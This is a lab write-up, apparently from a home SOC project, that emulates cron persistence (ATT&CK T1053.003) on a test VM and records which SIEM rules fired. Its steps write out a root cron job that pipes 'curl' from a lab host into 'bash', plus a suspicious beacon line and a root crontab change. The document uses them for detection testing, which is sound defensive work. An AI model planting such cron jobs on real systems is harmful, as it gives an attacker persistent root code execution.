# 03: Cron persistence

- **ATT&CK technique:** T1053.003 Scheduled Task/Job: Cron
- **Target:** soc-victim-01 (192.168.64.2)
- **Date run:** 2026-11-10

## Goal
Plant a scheduled job so the attacker keeps code execution after logout or reboot — a classic persistence mechanism. The SIEM must flag changes to cron paths and, louder, cron jobs whose content looks like a download or reverse shell.

## Steps
```bash
# [VM] as <admin>, via sudo
# drop a cron.d job (payload points only at the lab Mac / a non-existent script — nothing harmful runs)
echo '* * * * * root curl -s http://192.168.64.1/p | bash' | sudo tee /etc/cron.d/soc-lab-persist
# modify it so a content diff is produced
echo '*/5 * * * * root /tmp/beacon base64 -d' | sudo tee -a /etc/cron.d/soc-lab-persist
# change root's own crontab
( sudo crontab -l 2>/dev/null; echo '* * * * * /tmp/eviltask.sh' ) | sudo crontab -
```

## Expected evidence
File-integrity alerts on the cron paths; a higher-severity alert when a cron change contains download/shell keywords; a built-in alert for a root crontab change.

## Result (live, 2026-11-10)
| Rule | Level | Path | Note |
|---|---|---|---|
| **100120** | **10** | /etc/cron.d/soc-lab-persist, /var/spool/cron/crontabs/root | custom: cron file added or changed |
| **100121** | **13** | /etc/cron.d/soc-lab-persist | custom: cron change with suspicious content — matched `/tmp/` and `base64` in the **diff of the appended line**. The `curl \| bash` line was in the newly created file, which carries no diff, so only the later `tee -a` modify produced a diff to inspect. |
| 2833 | 8 | — | built-in: root's crontab entry changed |

Archive showed the planted job **executed 8 seconds after it was detected** (file detected 01:25:53, first run 01:26:01), giving a tight detection-then-execution timeline. `alert_new_files=yes` is set, so the new cron file was not silently missed.

> Rule 100122 was originally written to match cron `RELOAD` log lines — which Ubuntu 24.04's cron does not emit at its default log level, so it could never fire. It was rewritten to alert on cron **job executions** containing the same suspicious keywords.

**100122 confirmed live (2026-11-10):** a harmless follow-up job `* * * * * root /tmp/soc-lab-noop` fired **100120 L10** (file added) and, when it ran a minute later, **100122 L12** on `CRON (root) CMD (/tmp/soc-lab-noop)` (the `/tmp/` keyword). The job was removed afterward.

## Cleanup
```bash
# [VM]
sudo rm /etc/cron.d/soc-lab-persist
sudo crontab -r
```

## Linked detection
[`../detections/03-cron-persistence.md`](../detections/03-cron-persistence.md)
